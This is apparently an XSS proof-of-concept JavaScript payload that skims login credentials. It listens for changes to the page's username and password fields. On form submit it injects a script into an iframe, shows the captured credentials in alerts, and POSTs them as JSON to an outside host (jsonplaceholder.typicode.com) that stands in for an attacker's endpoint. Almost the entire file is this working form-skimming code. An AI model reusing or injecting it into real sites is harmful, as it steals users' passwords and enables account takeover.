// alert('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?');
top.console.log('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?');

// f = document.createElement("iframe");
// f.id = "pwn";
// f.src = "/";
var usr;
var pw;
// f.onload = () => {

top.document.addEventListener('change', e => {
  if (event.target.matches('#username')) {
    usr = e.target.value;
  } else if (e.target.matches('#password')) {
    pw = e.target.value
  }
}, false)
  // top.username.addEventListener('change', e => usr = e.target.value);
  // top.password.addEventListener('change', e => usr = e.target.value);
  //
  top.document.forms[0].addEventListener('submit', () => {
    console.log("submitting a form", usr, pw);

    if (top.document.forms[0].elements[0].classList.contains('hidden-input')) {
      console.log("doing shit", top.password.value);
      pw = top.password.value;
      x = document.createElement('script');
      x.src = 'data:,alert("Pwned "+usr+" "+pw)';
      pwn.contentWindow.document.body.appendChild(x)
      alert('Wow!, submitted usr password ' + usr + ' ' + pw);

      fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST',
        headers: {'Accept': 'application/json', 'Content-Type': 'application/json' },
        body: JSON.stringify({a: usr, b: pw})
      }).then(resp => {
        console.log(resp.json());
      })
    } else {
      console.log("not doing anything");
      console.log(top.document.forms[0].elements[0]);
    }
  })
// };